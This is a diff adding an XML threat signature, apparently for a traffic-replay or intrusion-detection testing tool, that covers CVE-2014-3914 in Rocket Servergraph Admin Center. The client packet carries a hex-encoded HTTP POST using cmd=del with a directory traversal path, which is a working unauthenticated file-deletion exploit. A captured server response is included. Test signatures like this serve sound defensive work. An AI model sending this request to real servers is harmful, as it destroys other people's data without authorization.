@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Rocket Servergraph Admin Center fileRequestor del Directory Traversal"/>
+    <EngDesc display="true" value="A denial of service vulnerability exists in Rocket Servergraph, an interface for monitoring backup solutions such as IBM Tivoli Storage Manager, Symantec NetBackup etc. The vulnerability is due to a directory traversal when handling requests to the URI's fileRequestor.A remote unauthenticated attacker can exploit the vulnerability to delete files on the target server."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Moderate"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Rocket_software"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Servergraph_Admin_Center_for_TSM"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="1.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140603-16"/>
+    <CVEID display="true" value="CVE-2014-3914"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="107677"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="d5688d6b07c8c9ff633b4f2861c75a0d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="NONE"/>
+    <IntegImpact display="false" value="COMPLETE"/>
+    <AvailImpact display="false" value="COMPLETE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635445856160059061"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="C">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:90:27:86:A8:5A" destMac="00:50:56:B4:0E:03" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00F9" Identification="577C" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="80A3" srcIP="172.16.1.162" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="58718" destPort="$HTTPdestPort" SeqNumber="9E683E72" AckNumber="CE894551" HeaderLength="08" WindowSize="016D" Checksum="6257" UrgentPointer="0000" Options="0101080A2FBF690C00000000" Payload="504F5354202F53475041646D696E2F66696C655265717565737420485454502F312E310D0A486F73743A206468637032390D0A436F6E74656E742D4C656E6774683A203130370D0A636F6E74656E742D747970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A6163636570742D656E636F64696E673A20677A69702C206465666C6174650D0A757365722D6167656E743A20507974686F6E2D687474706C6962322F302E372E372028677A6970290D0A0D0A26696E766F6B65723D414141267469746C653D42424226706172616D733D4343432669643D44444426636D643D64656C26736F757263653D2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E2671756572793D74656C75732E747874" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="00:50:56:B4:0E:03" destMac="00:90:27:86:A8:5A" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0189" Identification="4160" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="562F" srcIP="$destIP" destIP="172.16.1.162" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="58718" SeqNumber="CE894551" AckNumber="9E683FA2" HeaderLength="08" WindowSize="F9C0" Checksum="88BD" UrgentPointer="0000" Options="0101080A000EABC52FBF6935" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A43616368652D436F6E74726F6C3A20707269766174650D0A507261676D613A206E6F2D63616368650D0A5365742D436F6F6B69653A204A53455353494F4E49443D32424537383433333931363839414630343346454345373032434139393641313B20506174683D2F53475041646D696E2F3B20487474704F6E6C790D0A436F6E74656E742D547970653A20746578742F706C61696E3B636861727365743D5554462D380D0A436F6E74656E742D4C656E6774683A2037320D0A446174653A205475652C203135204A756C20323031342031383A30303A333320474D540D0A0D0A3C726177526573756C74206572726F723D2266616C7365223B20636F6C756D6E733D6E756C6C3B20646174613D74656C75732E7478743C454F4C3E3B202F726177526573756C743E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
